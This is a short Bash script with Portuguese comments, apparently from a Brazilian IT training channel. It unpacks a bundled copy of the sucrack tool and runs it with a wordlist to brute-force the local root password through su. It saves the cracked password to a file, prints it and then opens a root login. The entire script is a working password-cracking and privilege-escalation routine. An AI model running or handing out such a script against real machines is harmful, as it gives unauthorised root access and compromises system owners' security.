#!/bin/bash
# Autor: Robson Vaamonde
# Site: www.procedimentosemti.com.br
# Facebook: facebook.com/ProcedimentosEmTI
# Facebook: facebook.com/BoraParaPratica
# YouTube: youtube.com/BoraParaPratica
# Data de criação: 31/10/2016
# Data de atualização: 31/10/2016
# Versão: 1.0

# Descompactando o arquivo .deb do Sucrack
ar -x sucrack.deb >> /dev/null

# Descompactando o arquivo data.tar.gz do Sucrack
tar -zxvf data.tar.gz >> /dev/null

#Acessando o diretório do seu binário
cd usr/bin

#Executando o binário do Sucrack utilizando a Wordlist senhas.txt
./sucrack ../../senhas.txt >> ../../root.txt

#Restartando o terminal (Sucrack congela a tela)
reset

echo -e "A senha do usuário Root é:"
cat ../../root.txt
echo
echo -e "Digite a senha descoberta pelo Sucrack para se autenticar como Root"
su
